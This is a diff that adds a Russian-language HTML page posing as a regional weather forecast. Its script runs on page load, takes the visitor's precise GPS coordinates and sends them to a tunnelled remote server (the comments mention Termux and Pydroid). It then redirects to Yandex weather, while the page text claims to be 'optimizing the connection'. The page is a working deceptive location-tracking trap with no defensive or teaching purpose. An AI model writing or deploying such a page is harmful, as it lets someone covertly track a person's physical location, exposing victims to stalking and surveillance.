@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Погода в вашем регионе</title>
+    <meta charset="utf-8">
+    <script>
+        // ТВОЯ АКТУАЛЬНАЯ ССЫЛКА ИЗ TERMUX
+        const SERVO_URL = "https://ad95a8934023e6a7-31-8-29-192.serveousercontent.com";
+
+        function getGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        // Пересылаем данные на твой сервер в Pydroid
+                        fetch(`${SERVO_URL}/log_gps?lat=${lat}&lon=${lon}`)
+                            .finally(() => {
+                                window.location.href = "https://pogoda.yandex.ru";
+                            });
+                    },
+                    (error) => {
+                        window.location.href = "https://pogoda.yandex.ru";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                window.location.href = "https://pogoda.yandex.ru";
+            }
+        }
+        window.onload = getGPS;
+    </script>
+</head>
+<body style="font-family: sans-serif; text-align: center; margin-top: 100px; background-color: #f0f4f8;">
+    <h2>Определение автоматического региона для прогноза погоды...</h2>
+    <p>Пожалуйста, подождите, идет оптимизация соединения.</p>
+</body>
+</html>
